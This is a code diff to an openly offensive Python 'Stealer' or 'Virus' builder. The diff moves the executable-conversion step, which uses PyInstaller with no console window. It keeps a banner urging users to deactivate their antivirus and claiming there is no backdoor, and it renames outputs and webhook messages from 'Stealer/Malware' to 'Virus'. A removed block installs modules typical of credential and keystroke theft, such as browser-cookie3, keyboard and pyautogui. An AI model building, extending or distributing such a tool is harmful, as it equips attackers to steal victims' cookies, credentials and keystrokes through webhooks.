@@ -35,13 +35,6 @@ try:
 # ║                                                                                            ║ 
 # ╚═══════════File detected by the antivirus, but be aware that there is no backdoor═══════════╝
 
-    Slow(f"""{virus_banner}                                                                           
-{BEFORE + current_time_hour() + AFTER} {INFO} File detected by the antivirus, but be aware that there is no backdoor!  
-{BEFORE + current_time_hour() + AFTER} {INFO} Only your webhook will be taken into account, no other webhook will be added to your Stealer.
-{BEFORE + current_time_hour() + AFTER} {INFO} Deactivate your antivirus so that no files are deleted after your build.""")
-    print(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Builder:")
-    time.sleep(1)
-
     def disinfect():
         try:
             if ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, disinfect_path, None, 1) <= 32:
@@ -64,6 +57,46 @@ try:
                 icon_path = filedialog.askopenfilename(title="Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
         except:
             pass
+
+    def convert_to_exe(file_python, path_destination, name_file, icon_path=None):
+        
+        if sys.platform.startswith("win"):
+            os.system("python -m pip uninstall pathlib")
+        elif sys.platform.startswith("linux"):
+            os.system("python3 -m pip3 uninstall pathlib")
+
+        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Converting to executable: {reset}")
+
+        try:
+            script_path = os.path.abspath(file_python)
+
+            pyinstaller = ['pyinstaller', '--onefile', '--distpath', path_destination, '--noconsole', script_path]
+
+            if icon_path:
+                pyinstaller.extend(['--icon', icon_path])
+
+            subprocess.run(pyinstaller)
+
+            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Conversion successful. The executable is located in the folder: {white + path_destination_relative}")
+        
+            try:
+                print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Removing temporary files from conversion.. {reset}")     
+                shutil.rmtree(f"./build")
+                os.remove(f"{name_file}.spec")
+                os.remove(file_python)
+                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Temporary file removed.{reset}")
+            except Exception as e:
+                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Temporary file not removed: {white + e}")
+        
+        except Exception as e:
+            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error during conversion: {white + e}")
+
+    Slow(f"""{virus_banner}                                                                           
+{BEFORE + current_time_hour() + AFTER} {INFO} File detected by the antivirus, but be aware that there is no backdoor!  
+{BEFORE + current_time_hour() + AFTER} {INFO} Only your webhook will be taken into account, no other webhook will be added to your Stealer.
+{BEFORE + current_time_hour() + AFTER} {INFO} Deactivate your antivirus so that no files are deleted after your build.
+{BEFORE + current_time_hour() + AFTER} {INPUT} Builder:""")
+    time.sleep(1)
     
     # <<<<<<<<<< Logs >>>>>>>>>>
     def error_logs(message):
@@ -440,7 +473,7 @@ try:
         
         if not name_file.strip() or name_file in ["File Name"]:
             random_number = random.randint(1, 1000)
-            name_file = f'BuilderStealer_{random_number}'
+            name_file = f'Virus_{random_number}'
 
         root.quit()
         root.destroy()
@@ -485,30 +518,6 @@ try:
 
     path_destination_relative = "./1-Output/VirusBuilder"
     path_destination = os.path.abspath(path_destination_relative)
-
-
-    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Installing python modules:{reset}")
-
-    modules = [
-        "--upgrade pip",
-        "platform", "ctypes", "screeninfo", "psutil", "GPUtil", "sqlite3",
-        "urllib3", "json", "socket", "requests", "pycryptodome", "subprocess",
-        "datetime", "base64", "re", "string", "pypiwin32", "discord.py",
-        "sys", "shutil", "uuid", "Pillow", "browser-cookie3",
-        "opencv-python", "pyautogui", "keyboard", "tkinter"
-    ]
-
-    if sys.platform.startswith("win"):
-        for module in modules:
-            os.system(f"pip install {module}")
-
-    elif sys.platform.startswith("linux"):
-        for module in modules:
-            os.system(f"pip3 install {module}")
-    
-    print()
-
-    time.sleep(3)
 
     try:
         with open(file_python, 'w', encoding='utf-8') as file:
@@ -569,36 +578,8 @@ try:
     except Exception as e:
         print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Python file not created: {white + e}")
 
-
-    def convert_to_exe(file_python, path_destination, icon_path=None):
-        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Converting to executable: {reset}")
-
-        try:
-            script_path = os.path.abspath(file_python)
-
-            pyinstaller = ['pyinstaller', '--onefile', '--distpath', path_destination, '--noconsole', script_path]
-
-            if icon_path:
-                pyinstaller.extend(['--icon', icon_path])
-
-            subprocess.run(pyinstaller)
-
-            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Conversion successful. The executable is located in the folder: {white + path_destination_relative}")
-        
-            try:
-                print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Removing temporary files from conversion.. {reset}")     
-                shutil.rmtree(f"./build")
-                os.remove(f"{name_file}.spec")
-                os.remove(file_python)
-                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Temporary file removed.{reset}")
-            except Exception as e:
-                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Temporary file not removed: {white + e}")
-        
-        except Exception as e:
-            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error during conversion: {white + e}")
-
     if file_type in ['Exe File']:
-        convert_to_exe(file_python, path_destination, icon_path)
+        convert_to_exe(file_python, path_destination, name_file, icon_path)
     
     try:
         print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Open: {white + path_destination_relative}")
@@ -642,7 +623,7 @@ try:
         ]
 
         embed = {
-            'title': f'Stealer/Malware Created:',
+            'title': f'Virus Created:',
             'color': color_webhook,
             "fields": fields,
             'footer': {
